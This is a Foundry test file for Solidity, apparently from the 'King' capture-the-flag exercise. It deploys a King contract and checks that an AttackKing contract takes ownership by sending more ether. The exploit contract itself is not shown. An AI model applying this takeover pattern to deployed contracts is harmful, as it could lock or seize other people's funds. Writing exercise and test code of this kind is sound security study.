// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";

import "src/king.sol";
contract KingTest is Test {
    King king;
    AttackKing attacker;

    function setUp() public {
        vm.startPrank(address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266));
        king = new King();
        (bool set, ) = address(king).call.value(1 ether)("");
        // require(set, "Failed to set Prize!!");
        uint prize = king.prize();
        emit log_named_uint("set prize", prize);
        attacker = new AttackKing();
        emit log_named_address("king", address(king));
        emit log_named_address("attacker", address(attacker));
        vm.stopPrank();
    }

    function testClaimKingship() public {
        vm.startPrank(address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8));
        address owner = king.owner();
        uint prize = king.prize();
        emit log_named_uint("prize", prize);
        emit log_named_address("owner", owner);
        emit log_named_address("tester", address(this));

        attacker.becomeKing.value(2 ether)(address(king));
        emit log_named_address("newOwner", king.owner());
        assertEq(king.owner(), address(attacker));
        // vm.stopPrank();
    }

}
